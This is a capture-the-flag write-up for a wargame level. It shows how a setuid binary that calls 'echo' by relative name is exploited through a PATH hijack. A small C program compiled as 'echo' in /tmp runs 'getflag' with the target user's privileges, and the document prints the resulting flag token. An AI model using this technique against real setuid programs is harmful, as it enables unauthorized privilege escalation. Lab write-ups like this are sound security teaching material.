# level03 - PATH abuse attack

## Summary

For this exploit, on `HOME` directory, we have the binary `level03` with the flag03’s user **suid bit** sets on it:
```shell
~$ ls -l level03

-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
Also, when we read the binary with `hexdump`, we can see that the binary use command `echo` without its absolute path…
```shell
~$ hexdump -C level03

...
000005d0  ff 83 c4 08 5b c3 00 00  03 00 00 00 01 00 02 00  |....[...........|
000005e0  2f 75 73 72 2f 62 69 6e  2f 65 6e 76 20 65 63 68  |/usr/bin/env ech|
000005f0  6f 20 45 78 70 6c 6f 69  74 20 6d 65 00 00 00 00  |o Exploit me....|
00000600  01 1b 03 3b 30 00 00 00  05 00 00 00 70 fd ff ff  |...;0.......p...|
...
```
This being, we can add our directory to the environment variable `PATH` with our malicious `echo` to run command `getflag` with flag03 user privileges

<br>

## Exploit

  - Copy `exploit03.c` from host to `/tmp` :
  ```shell
  ~$ cat /tmp/exploit03.c

  #include <stdio.h>
  #include <stdlib.h>

  void main() {
      printf("Malicious binary env loaded\n");
      system("getflag");
  }
  ```

  - Add `/tmp` to the `PATH`
  ```shell
  ~$ export PATH=/tmp:$PATH
  ```

  - Compile with echo as name and run the binary level03.
  ```shell
  ~$ (cd /tmp && gcc -o echo exploit03.c) && ./level03

  Malicious binary env loaded
  Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
  ```
> On this exploit, we ran directly command `getflag` from flag03's user. So, just log on level04 user.
